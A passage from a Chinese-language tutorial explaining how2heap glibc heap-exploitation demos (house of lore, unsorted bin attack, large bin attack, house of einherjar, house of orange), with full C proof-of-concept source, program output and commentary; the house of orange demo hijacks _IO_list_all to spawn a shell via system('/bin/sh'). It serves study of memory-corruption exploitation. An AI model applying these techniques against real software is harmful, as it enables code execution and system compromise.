  fprintf(stderr,"Set size for next allocation and the bk pointer to any writable address");
  stack_buffer[1] = 0x100 + 0x10;
  stack_buffer[3] = (intptr_t)stack_buffer;

  //------------VULNERABILITY-----------
  fprintf(stderr,"Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
  fprintf(stderr,"Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && <av->system_mem\n");
  victim[-1] = 32;
  victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
  //------------------------------------

  fprintf(stderr,"Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
  fprintf(stderr,"malloc(0x100): %p\n", malloc(0x100));
}
```

输出：

```
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0x2020010, it will be inserted in the unsorted bin
Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && <av->system_mem
Now next malloc will return the region of our fake chunk: 0x7ffe82ca7160
malloc(0x100): 0x7ffe82ca7160
```

首先分配一个 0x100 的 chunk`victim`，在下面再垫一个 chunk 防止与 top chunk 合并，释放 `victim` 进入 unsorted bin。现在在栈上伪造大小为 `0x110` 的 chunk，并使其 `bk` 指向任意一个可写地址，比如自身。

假设存在漏洞可以修改 `victim` 的 `chunk_size` 和 `bk`，那么我们可以将它的 `chunk_size` 改为合法 `nextsize` 范围内的一个值，且小于 0x100。而 `bk` 则改为我们刚才伪造的 chunk。这样下一次 `malloc(0x100)` 就会顺着 `bk` 查找，首先找到 `victim` 但大小不够，放入 small bin。随后找到我们伪造的 chunk 并返回，此时伪造 chunk 的 `fd` 已经指向 `main_arena+88`，可以借此泄露 libc。

## unsorted_bin_attack

源码：

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    fprintf(stderr,"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
    fprintf(stderr,"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var=0;
    fprintf(stderr,"Let's first look at the target we want to rewrite on stack:\n");
    fprintf(stderr,"%p: %ld\n\n", &stack_var, stack_var);

    unsigned long *p=malloc(400);
    fprintf(stderr,"Now, we allocate first normal chunk on the heap at: %p\n",p);
    fprintf(stderr,"And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
    malloc(500);

    free(p);
    fprintf(stderr,"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
           "point to %p\n",(void*)p[1]);

    //------------VULNERABILITY-----------

    p[1]=(unsigned long)(&stack_var-2);
    fprintf(stderr,"Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
    fprintf(stderr,"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

    //------------------------------------

    malloc(400);
    fprintf(stderr,"Let's malloc again to get the chunk we just free. During this time, the target should have already been"
           "rewritten:\n");
    fprintf(stderr,"%p: %p\n", &stack_var, (void*)stack_var);
}
```

输出：

```
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7fff4c4511e8: 0

Now, we allocate first normal chunk on the heap at: 0x1023010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f60208a2b78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fff4c4511d8

Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
0x7fff4c4511e8: 0x7f60208a2b78
```

和上一个类似，我们看到在 `free(p1)` 后，其 `bk` 指向 `main_arena+88`。假设存在漏洞可以修改其 `bk`，那么我们修改成目标地址 - 0x10 的位置，相当于伪造了一个 fake chunk。那么我们在拿回 `p1` 的时候，我们的 fake chunk 会被认为是 unsorted bin 中的下一个 chunk，因此其 `bk` 也被修改为 `main_arena+88`，于是我们在栈上写入了一个 `unsigned long` 值。

## large_bin_attack

源码：

```c
/*

    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]

 */

#include<stdio.h>
#include<stdlib.h>

int main()
{
    fprintf(stderr,"This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    fprintf(stderr,"In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr,"Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr,"stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr,"stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x320);
    fprintf(stderr,"Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);

    fprintf(stderr,"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           "the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x400);
    fprintf(stderr,"Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    fprintf(stderr,"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           "the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x400);
    fprintf(stderr,"Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);

    fprintf(stderr,"And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           "the third large chunk during the free()\n\n");
    malloc(0x20);

    free(p1);
    free(p2);
    fprintf(stderr,"We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           "[%p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

    malloc(0x90);
    fprintf(stderr,"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            "freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            "[%p]\n\n", (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr,"Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           "[%p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));

    //------------VULNERABILITY-----------

    fprintf(stderr,"Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            "as well as its \"bk\"and \"bk_nextsize\"pointers\n");
    fprintf(stderr,"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            "at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\"to 16 bytes before stack_var1 and"
            "\"bk_nextsize\"to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);

    fprintf(stderr,"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            "During this time, targets should have already been rewritten:\n");

    fprintf(stderr,"stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr,"stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    return 0;
}
```

输出：

```
This file demonstrates large bin attack by writing a large unsigned long value into stack
In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the targets we want to rewrite on stack:
stack_var1 (0x7fff33530b00): 0
stack_var2 (0x7fff33530b08): 0

Now, we allocate the first large chunk on the heap at: 0xef3000
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()

Then, we allocate the second large chunk on the heap at: 0xef3360
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()

Finally, we allocate the third large chunk on the heap at: 0xef37a0
And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()

We free the first and second large chunks now and they will be inserted in the unsorted bin: [0xef3360 <--> 0xef3000 ]

Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [0xef30a0]

Now, we free the third large chunk and it will be inserted in the unsorted bin: [0xef37a0 <--> 0xef30a0 ]

Now emulating a vulnerability that can overwrite the freed second large chunk's"size"as well as its"bk"and"bk_nextsize" pointers
Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2

Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
stack_var1 (0x7fff33530b00): 0xef37a0
stack_var2 (0x7fff33530b08): 0xef37a0
```

这种攻击方法在 glibc 2.29 推出，unsorted bin attack 失效之后可能会有大的用武之地。

首先分配了一个 small chunk `p1`，然后分配了 2 个 large chunk `p2` 和 `p3`。在每个 chunk 后面都插一小段 fast chunk 防止合并。释放掉 `p1` 和 `p2`，两者都会进入 unsorted bin。

随后申请比 `p1` 小的 chunk，这一步比较复杂：

1. 从 unsorted bin 末尾拿出 `p1`，放入对应 small bin
2. 从 unsorted bin 末尾拿出 `p2`，由于 large bin 为空，直接放入对应 large bin
3. unsorted bin 已经空了，于是从 small bin 中拿出 `p1`，切割 0x90 的 chunk 返回给程序
4. `p1` 被切割剩下的部分 `_p1` 重新回到 unsorted bin

再释放 `p3`，也进入 unsorted bin。这时，large bin 中有 `p2` 一个 chunk，大小为 0x410；unsorted bin 中有 `p3`，`_p1` 两个 chunk，大小分别为 0x410,0x290（0x330-0xa0）。

现在假设能控制整个 `p2` 的内容，让它的 `chunk_size=0x3f1`，`bk=addr1` 且 `bk_nextsize=addr2`。那么再次申请 small chunk 时：

1. 从 unsorted bin 末尾拿出 `_p1`，放入对应 small bin
2. 从 unsorted bin 末尾拿出 `p3`，准备放入对应 large bin，但是对应 large bin 非空
3. 从对应 large bin 第一个 chunk（`p2`）开始遍历，由于 `p2` 大小被修改，`0x3f0 < 0x410`，所以 `p3` 插入到了链表头。

插入的代码是这样的，注意这里没有检查 `bk_nextsize` 的合法性：

```c
if ((unsigned long) size == (unsigned long) fwd->size)
  /* Always insert in the second position.  */
  fwd = fwd->fd;
else
  {
    victim->fd_nextsize = fwd;
    victim->bk_nextsize = fwd->bk_nextsize;
    fwd->bk_nextsize = victim;
    victim->bk_nextsize->fd_nextsize = victim;
  }
bck = fwd->bk;
```

这里的 `victim` 是 `p3`，`fwd` 是 `p2`，注意两者大小不能相等，因为漏洞在 `else` 里。由于 `fwd->bk_nextsize` 是 `addr2`，于是第二行把这个值给了 `victim->bk_nextsize`，第四行就等价于 `*(addr2+4) = victim`。

同时，这里令 `bck = fwd->bk` 即 `addr1`，而接着还会执行一段代码：

```c
mark_bin (av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```

这里 `bck->fd = victim` 就等价于 `*(addr1+2) = victim`。于是我们成功修改了 `addr1+2` 和 `addr2+4` 的值。

## house_of_einherjar

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak.
*/

int main()
{
    fprintf(stderr,"Welcome to House of Einherjar!\n");
    fprintf(stderr,"Tested in Ubuntu 16.04 64bit.\n");
    fprintf(stderr,"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

    uint8_t* a;
    uint8_t* b;
    uint8_t* d;

    fprintf(stderr,"\nWe allocate 0x38 bytes for 'a'\n");
    a = (uint8_t*) malloc(0x38);
    fprintf(stderr,"a: %p\n", a);

    int real_a_size = malloc_usable_size(a);
    fprintf(stderr,"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

    // create a fake chunk
    fprintf(stderr,"\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
    fprintf(stderr,"However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
    fprintf(stderr,"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
    fprintf(stderr,"(although we could do the unsafe unlink technique here in some scenarios)\n");

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


    fprintf(stderr,"Our fake chunk at %p looks like:\n", fake_chunk);
    fprintf(stderr,"prev_size (not used): %#lx\n", fake_chunk[0]);
    fprintf(stderr,"size: %#lx\n", fake_chunk[1]);
    fprintf(stderr,"fwd: %#lx\n", fake_chunk[2]);
    fprintf(stderr,"bck: %#lx\n", fake_chunk[3]);
    fprintf(stderr,"fwd_nextsize: %#lx\n", fake_chunk[4]);
    fprintf(stderr,"bck_nextsize: %#lx\n", fake_chunk[5]);

    /* In this case it is easier if the chunk size attribute has a least significant byte with
     * a value of 0x00. The least significant byte of this will be 0x00, because the size of
     * the chunk includes the amount requested plus some amount required for the metadata. */
    b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);

    fprintf(stderr,"\nWe allocate 0xf8 bytes for 'b'.\n");
    fprintf(stderr,"b: %p\n", b);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

    fprintf(stderr,"\nb.size: %#lx\n", *b_size_ptr);
    fprintf(stderr,"b.size is: (0x100) | prev_inuse = 0x101\n");
    fprintf(stderr,"We overflow 'a' with a single null byte into the metadata of 'b'\n");
    a[real_a_size] = 0;
    fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);
    fprintf(stderr,"This is easiest if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bit\n");
    fprintf(stderr,"If it had been modified, we would need a fake chunk inside "
           "b where it will try to consolidate the next chunk\n");

    // Write a fake prev_size to the end of a
    fprintf(stderr,"\nWe write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunk\n", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    fprintf(stderr,"Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

    //Change the fake chunk's size to reflect b's new prev_size
    fprintf(stderr,"\nModify fake chunk's size to reflect b's new prev_size\n");
    fake_chunk[1] = fake_size;

    // free b and it will consolidate with our fake chunk
    fprintf(stderr,"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
    free(b);
    fprintf(stderr,"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    //if we allocate another chunk before we free b we will need to
    //do two things:
    //1) We will need to adjust the size of our fake chunk so that
    //fake_chunk + fake_chunk's size points to an area we control
    //2) we will need to write the size of our fake chunk
    //at the location we control.
    //After doing these two things, when unlink gets called, our fake chunk will
    //pass the size(P) == prev_size(next_chunk(P)) test.
    //otherwise we need to make sure that our fake chunk is up against the
    //wilderness

    fprintf(stderr,"\nNow we can call malloc() and it will begin in our fake chunk\n");
    d = malloc(0x200);
    fprintf(stderr,"Next malloc(0x200) is at %p\n", d);
}
```

输出：

```
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x1cc0010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fffd1743240 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffd1743240
bck: 0x7fffd1743240
fwd_nextsize: 0x7fffd1743240
bck_nextsize: 0x7fffd1743240

We allocate 0xf8 bytes for 'b'.
b: 0x1cc0050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x1cc0040 - 0x7fffd1743240 = 0xffff80003057ce00

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff80003059ddc1 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fffd1743250
```

这个利用方式基于 off-by-null，首先伪造 chunk，使其 `fd,bk,fd_nextsize,bk_nextsize` 均指向自身以绕过 unlink 检查。然后申请大小以 `8` 结尾的 chunk `a`，以及实际大小以 `0` 结尾的 chunk `b`，这样从 `a` 溢出时仅仅修改了 `b` 的 `PREV_INUSE` 位，同时 `a` 还能伪造 `b` 的 `prev_size` 字段。

我们将 `b` 的 `prev_size` 设置为 `b` 的 chunk 指针地址减去 fake chunk 的 chunk 指针地址，对 fake chunk 的 `size` 字段也作相应修改，那么释放 `b` 时就会和 fake chunk 合并，下次再申请时就能拿到 fake chunk 了。

## house_of_orange

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*/
int winner (char *ptr);

int main()
{
    /*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.

      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page

      If the size requested is smaller than 0x21000, then the former is followed.
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr,"The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");

    fprintf(stderr,"Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");

    /*
      Firstly, lets allocate a chunk on the heap.
    */

    p1 = malloc(0x400-16);

    /*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we've allocate a chunk of size 0x400 already,
       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.

       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.

       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.

       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk's prev_inuse bit has to be set.

       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What's left is 0x20c01

       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */

    top = (size_t *) ((char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /*
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.

       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.

       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.

       After the size of the Top chunk has been updated, this chunk gets freed.

       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free

       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */

    p2 = malloc(0x1000);
    /*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end

      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins


      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)

      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.

      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.

      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
    */

    io_list_all = top[2] + 0x9a8;

    /*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.

      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.

      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.

      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      So, we should set chunk->bk to be _IO_list_all - 16
    */

    top[3] = io_list_all - 0x10;

    /*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */

    memcpy((char *) top, "/bin/sh\x00", 8);

    /*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

      Since we overflow the old top chunk, we also control it's size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.

      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;

    /*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      We want to satisfy the first condition:
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    _IO_FILE *fp = (_IO_FILE *) top;


    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the _IO_FILE struct:
      base_address+sizeof(_IO_FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8


    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{
    system(ptr);
    return 0;
}
```

输出就没有必要放了。

先申请了实际大小为 0x400 的 chunk，然后为了满足页对齐以及 top chunk 的 `PREV_INUSE` 位的条件，通过溢出修改 top chunk 的 `size` 为 `0xc01`。此时，如果我们再申请一个 top chunk 大小不能满足的 chunk，就会申请新的 top chunk，而 old top 进入 unsorted bin 中。

接下来，我们利用 libc 的异常处理程序 getshell。出现异常并终止程序时，会调用 `_IO_flush_all_lockp`，遍历 `_IO_list_all` 并对它们依次调用 `_IO_OVERFLOW`。不难想到，如果伪造 `_IO_list_all` 指针的前 8 字节为 `/bin/sh\x00`，再伪造 `_IO_OVERFLOW` 为 `system`，就可以达到目的。其中，`_IO_list_all` 地址可由已经在 unsorted bin 中的 old top 的 fd 也就是 `main_arena+88` 推算出来。

如果我们后续要切割这块 old top 来满足内存申请，那么 `old_top->bk->fd` 会被覆盖为 `main_arena+88`，这和 unsorted bin attack 涉及的原理是一样的。那么我们希望覆盖 `_IO_list_all` 为 `main_arena+88`，只需要令 `old_top->bk = io_list_all-0x10` 即可，其中 `io_list_all` 表示 `_IO_list_all` 的地址。但问题在于，用于覆盖的值 `main_arena+88` 不是我们可控的值，因此我们期望能控制其 fd 指针。

已知下一个文件指针位于文件指针地址 `+0x68` 处，这恰好对应于 `smallbin[4]`，存放大小为 `90-98` 之间的 small chunk。如果我们设置 old top 的大小为 `0x61`，然后申请一个小块使得 old top 不会被分配出去，那么它就会进入到 `smallbin[4]` 中，成为链表头，同时也成为了我们伪造的文件指针的 fd 指针。

然后用 old top 伪造文件指针，满足这几个条件：

```c
    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28
```

最后，覆盖 `_IO_jump_t[3]` 也就是 `_IO_OVERFLOW` 使其指向 `winner` 函数，或者说 `system` 函数。

## calc_tcache_size

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>


struct malloc_chunk {

  size_t      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  size_t      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

/* The corresponding word size.  */
#define SIZE_SZ (sizeof (size_t))

#define MALLOC_ALIGNMENT (2 * SIZE_SZ < __alignof__ (long double) \
              ? __alignof__ (long double) : 2 * SIZE_SZ)

/* The corresponding bit mask value.  */
#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)

/* The smallest possible chunk */
#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))

/* The smallest size we can malloc is an aligned minimal chunk */
#define MINSIZE  \
  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))

#define request2size(req)                                         \
